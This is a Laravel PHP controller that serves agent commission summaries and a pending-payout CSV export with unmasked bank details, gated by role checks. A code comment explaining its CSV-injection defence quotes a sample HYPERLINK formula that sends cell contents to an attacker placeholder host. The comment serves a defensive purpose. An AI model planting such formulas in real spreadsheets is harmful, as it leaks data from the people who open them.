<?php

namespace App\Http\Controllers\Api\V1;

use App\Enums\Ability;
use App\Enums\PaymentStatus;
use App\Http\Controllers\Controller;
use App\Models\User;
use App\Services\Commission\AgentCommissionSummaryService;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Validation\Rule;
use Symfony\Component\HttpFoundation\StreamedResponse;

// TASK-043 §3 — "ค่าคอมมิชชั่น" submenu under "จัดการตัวแทน": per-agent
// commission summary (total_paid_satang / total_pending_satang /
// entry_count per agent). Read-only aggregate over existing
// commission_ledger rows — same abort_unless + `['data' => ..., 'computed_at'
// => now()]` shape as PlatformReportController/ConfigHealthReportController
// (TASK-041), since the payload is curated aggregate rows, not raw
// Eloquent models (Section 7 API Resource rule doesn't apply here for
// the same reason it doesn't for those two).
//
// Company Admin (own company only) or Super Admin (all companies,
// optionally narrowed via ?company_id=) only — Agent gets 403.
// CommissionLedgerPolicy::viewAny() is deliberately NOT reused here:
// that ability answers "can this user list commission_ledger rows at
// all" (yes, narrowed to their own at the query level in
// CommissionLedgerController::index()) — this endpoint's entire point
// is a cross-agent view, which an Agent has no legitimate use for, so
// it's gated the same explicit-role way as the other TASK-041 report
// endpoints rather than being shoehorned into the per-row ledger Policy.
//
// TASK-044 §2 — date_from/date_to/payment_status are optional query
// filters, additive to the company_id scoping above (BR-6 unchanged).
// Validated inline via $request->validate() rather than a dedicated
// Form Request class: every other GET-with-query-param report endpoint
// in this codebase (AuditLogController::index(), which already has its
// own date_from/date_to; ConfigHealthReportController::index()) reads
// query params directly off $request with no Form Request either, so a
// Form Request here would be the odd one out for a single index()
// action with no body. Unlike AuditLogController::index() though, this
// endpoint's payment_status is a new enum-typed filter — left fully
// unchecked, a typo'd value would silently match zero rows instead of
// telling the caller it's wrong — so, still "lightweight inline", an
// explicit validate() call is used rather than AuditLogController's
// bare filled()-only check.
class AgentCommissionSummaryController extends Controller
{
    public function index(Request $request, AgentCommissionSummaryService $service): JsonResponse
    {
        $user = $request->user();

        abort_unless($user->can(Ability::CommissionAgentSummaryView), 403);

        $companyId = $user->isSuperAdmin() && $request->filled('company_id')
            ? $request->integer('company_id')
            : null;

        $validated = $request->validate([
            'date_from' => ['sometimes', 'date'],
            'date_to' => ['sometimes', 'date'],
            'payment_status' => ['sometimes', Rule::enum(PaymentStatus::class)],
        ]);

        return response()->json([
            'data' => $service->buildSummary(
                actor: $user,
                companyId: $companyId,
                dateFrom: $validated['date_from'] ?? null,
                dateTo: $validated['date_to'] ?? null,
                paymentStatus: isset($validated['payment_status']) ? PaymentStatus::from($validated['payment_status']) : null,
            ),
            'computed_at' => now(),
        ]);
    }

    /**
     * TASK-044 §3 — bank payout CSV export. Deliberately kept on this same
     * Controller rather than a new dedicated one: it shares the EXACT auth
     * gate, EXACT query filters, and the EXACT aggregation source
     * (AgentCommissionSummaryService::buildSummary()) as index() above —
     * this is the same resource/concern ("agent commission summary"), just
     * a different representation (CSV file vs JSON), the same way e.g.
     * ClientDocumentController::download() sits next to index()/store()
     * rather than in its own Controller.
     *
     * This endpoint returns REAL, unmasked bank_account_number values (the
     * whole point — Admin needs the real number to actually run a bank
     * transfer). As of TASK-047, index() above also returns the real
     * number for the same human-confirmed reason (see
     * AgentCommissionSummaryService::buildSummary()'s own comment) — most
     * other read paths in this codebase still go through UserResource's
     * default masking (see that Resource's docblock), which is unchanged.
     * The auth gate below is therefore
     * copy-identical to index() (never weaker) — same
     * Company-Admin-own-company / Super-Admin(+?company_id=) rule, BR-6.
     *
     * Never blocks on missing bank data (task spec decision #3, human-
     * confirmed): every agent row is written to the CSV regardless, with
     * `missing_bank_info` set truthy when any of the 3 bank fields is
     * null/empty, so the opened file itself surfaces which rows still need
     * follow-up rather than silently dropping them or 4xx-ing the whole
     * export.
     *
     * Human request (2026-07-23): "export ส่ง csv ส่งไปเฉพาะยอดที่ต้องจ่าย" —
     * this file exists to actually GO RUN a bank payout, so it must only
     * ever contain money that is still owed. `payment_status` is therefore
     * no longer accepted as a query param here at all (unlike index()) —
     * paymentStatus is hardcoded to Pending below, which both (a) narrows
     * every row's amount to its pending total only, per
     * AgentCommissionSummaryService's filtered-aggregation branch, and
     * (b) — because that filter is applied BEFORE aggregation, see that
     * Service's own comment — drops any agent with zero pending balance
     * out of the result entirely, not just out of the displayed column.
     * The on-screen "สถานะการจ่าย" filter (index()) is unaffected and can
     * still show "จ่ายแล้ว"/"ทั้งหมด" — only the payout FILE is pending-only.
     * date_from/date_to remain accepted/applied exactly as before.
     */
    public function export(Request $request, AgentCommissionSummaryService $service): StreamedResponse
    {
        $user = $request->user();

        abort_unless($user->can(Ability::CommissionAgentSummaryExport), 403);

        $companyId = $user->isSuperAdmin() && $request->filled('company_id')
            ? $request->integer('company_id')
            : null;

        $validated = $request->validate([
            'date_from' => ['sometimes', 'date'],
            'date_to' => ['sometimes', 'date'],
        ]);

        $summaryRows = $service->buildSummary(
            actor: $user,
            companyId: $companyId,
            dateFrom: $validated['date_from'] ?? null,
            dateTo: $validated['date_to'] ?? null,
            paymentStatus: PaymentStatus::Pending,
        );

        // buildSummary() only eager-loads agent:id,name (index() never
        // needed bank fields) — deliberately NOT changing that shared
        // Service's return shape for this one caller (see this class's
        // own instructions/TASK-044 note). A second lightweight query
        // instead, keyed by agent_id, merged in below. TenantScope
        // (Section 5 rule 2) still applies to this query automatically
        // off the authenticated actor, so a Company Admin can never pull
        // bank fields for an agent outside their own company_id even if
        // that agent_id somehow leaked into $summaryRows — belt-and-
        // suspenders on top of buildSummary() already having scoped which
        // agent_ids exist in the result at all.
        $bankInfoByAgentId = User::whereIn('id', $summaryRows->pluck('agent_id'))
            ->get(['id', 'bank_name', 'bank_account_number', 'bank_account_holder_name'])
            ->keyBy('id');

        $filename = 'commission-payout-'.now()->format('Y-m-d').'.csv';

        return response()->streamDownload(function () use ($summaryRows, $bankInfoByAgentId) {
            // UTF-8 BOM — the Thai column headers below and Thai agent/
            // bank names in the data rows render as mojibake in Excel
            // without this (Excel does not assume UTF-8 for CSV without a
            // BOM), which would defeat the entire point of a payout file
            // meant to be opened and used directly.
            echo "\xEF\xBB\xBF";

            $out = fopen('php://output', 'w');

            fputcsv($out, [
                'ชื่อตัวแทน',
                'ธนาคาร',
                'เลขที่บัญชี',
                'ชื่อบัญชี',
                'ยอดที่ต้องจ่าย (บาท)',
                'จำนวนรายการ',
                'ข้อมูลธนาคารไม่ครบ',
            ]);

            foreach ($summaryRows as $row) {
                $bankInfo = $bankInfoByAgentId->get($row['agent_id']);

                $bankName = $bankInfo?->bank_name;
                $bankAccountNumber = $bankInfo?->bank_account_number;
                $bankAccountHolderName = $bankInfo?->bank_account_holder_name;

                $missingBankInfo = blank($bankName) || blank($bankAccountNumber) || blank($bankAccountHolderName);

                fputcsv($out, [
                    self::csvSafe($row['agent_name'] ?? ''),
                    self::csvSafe($bankName ?? ''),
                    self::csvSafe($bankAccountNumber ?? ''),
                    self::csvSafe($bankAccountHolderName ?? ''),
                    // BR-3 — integer satang everywhere upstream; dividing
                    // by 100 only here, at the CSV/display layer, exactly
                    // like the UI layer would. number_format guards
                    // against a satang value that isn't an exact multiple
                    // of 100 (should not normally happen, but a payout
                    // file must never silently truncate a fraction of a
                    // baht) rather than an implicit float-to-string cast.
                    // total_pending_satang here is ALREADY pending-only
                    // (paymentStatus: Pending forced above) — no separate
                    // "paid" column needed/shown in a payout file.
                    number_format($row['total_pending_satang'] / 100, 2, '.', ''),
                    $row['entry_count'],
                    $missingBankInfo ? 'ใช่' : '',
                ]);
            }

            fclose($out);
        }, $filename, [
            'Content-Type' => 'text/csv; charset=UTF-8',
        ]);
    }

    /**
     * Neutralise a spreadsheet formula in a CSV cell (SECURITY AUDIT 2026-08-21, V9).
     *
     * ── WHY THIS FILE IS THE ONE THAT NEEDED IT ──
     *
     * Four of the columns here are free text an AGENT types about
     * themselves — their name and their three bank fields, none of which
     * restricts the character set, because a bank account holder's name
     * legitimately can be almost anything. The reader is a Company Admin,
     * and what they do with this file is open it in Excel to pay people.
     * That is the complete CSV-injection setup: attacker-controlled text,
     * a spreadsheet, and a human who has every reason to trust the file
     * because their own system produced it.
     *
     * A cell beginning `=HYPERLINK("http://attacker.example/?x="&A1,"เปิด")`
     * exfiltrates whatever is in A1 the moment it is clicked; the DDE
     * variants on older Office builds do worse. Excel, not this app, is
     * what executes it — which is exactly why the app must not hand it
     * over armed.
     *
     * The fix is the boring standard one: a leading apostrophe makes the
     * spreadsheet treat the cell as text. It is invisible in the rendered
     * cell, so a payout file stays readable. Tab and CR are in the list
     * because both can shift a payload into a neighbouring cell.
     *
     * Only strings are passed through here. The money column is built by
     * number_format() from an integer and cannot begin with any of these.
     */
    private static function csvSafe(string $value): string
    {
        if ($value === '') {
            return $value;
        }

        return str_contains("=+-@\t\r", $value[0]) ? "'".$value : $value;
    }
}
